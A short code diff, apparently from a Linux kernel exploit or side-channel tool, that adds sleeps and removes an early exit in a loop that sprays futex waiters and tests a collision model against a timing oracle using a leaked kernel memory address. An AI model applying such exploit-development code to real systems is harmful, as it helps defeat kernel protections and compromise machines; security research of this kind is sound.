@@ -827,6 +827,7 @@ uintptr_t prepare_kernel_page(int payload_mode, size_t cand_round) {
     size_t agree = 0, disagree = 0, tested_c = 0, tested_m = 0;
     pr_info("[OVAL] mm=%016zx modelBucket(T)=%u\n", leaked, bT);
     __increase(ks, 128, APPENDED_FUTEXES);
+    usleep(300000); /* let the 4096 waiters actually block */
     for (size_t i = 2; i < ks->total_futexes; ++i) {
       size_t id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
       if (id >= FUTEX_SZ) break;
@@ -850,8 +851,8 @@ uintptr_t prepare_kernel_page(int payload_mode, size_t cand_round) {
                 c, tA, tB, oracle);
         if (!oracle) agree++; else disagree++;
       }
-      if (disagree) break; /* model broken - stop early */
       __increase(ks, 128, APPENDED_FUTEXES);
+      usleep(300000);
     }
     pr_info("[OVAL] RESULT agree=%zu disagree=%zu (collide=%zu miss=%zu)\n",
             agree, disagree, tested_c, tested_m);
